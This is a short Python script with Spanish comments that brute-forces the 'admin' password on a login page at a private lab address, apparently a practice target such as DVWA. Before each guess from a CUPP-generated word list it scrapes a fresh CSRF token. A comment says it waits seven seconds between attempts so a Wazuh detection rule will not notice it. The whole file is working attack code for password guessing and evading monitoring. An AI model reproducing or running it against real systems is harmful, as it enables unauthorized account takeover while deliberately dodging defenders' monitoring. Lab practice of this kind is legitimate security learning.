import requests
from bs4 import BeautifulSoup
import time

url = "http://192.168.122.28/login.php"
diccionario = "/home/walter/cupp/admin.txt"

# Creamos una "Sesión" para que el servidor nos recuerde (cookies)
s = requests.Session()

print("[*] Iniciando ataque de fuerza bruta con evasión de CSRF...")

with open(diccionario, "r") as file:
    for password in file.read().splitlines():
        
        # 1. Entramos a la web para robar el token fresco
        respuesta_get = s.get(url)
        soup = BeautifulSoup(respuesta_get.text, 'html.parser')
        # Buscamos el campo oculto 'user_token' en el código HTML
        token_fresco = soup.find('input', {'name': 'user_token'})['value']
        
        # 2. Preparamos nuestro ataque mezclando la contraseña y el token robado
        datos_post = {
            'username': 'admin',
            'password': password,
            'Login': 'Login',
            'user_token': token_fresco
        }
        
        # 3. Disparamos el ataque
        respuesta_post = s.post(url, data=datos_post)
        
        # 4. Comprobamos si hemos pasado
        if "Login failed" not in respuesta_post.text:
            print(f"[+] ¡BINGO! Contraseña encontrada: {password}")
            break
        else:
            print(f"[-] Fallo: {password} (Token usado: {token_fresco[:5]}...)")
            
        # Esperamos 7 segundos para que la regla de Wazuh no nos detecte
        time.sleep(7)
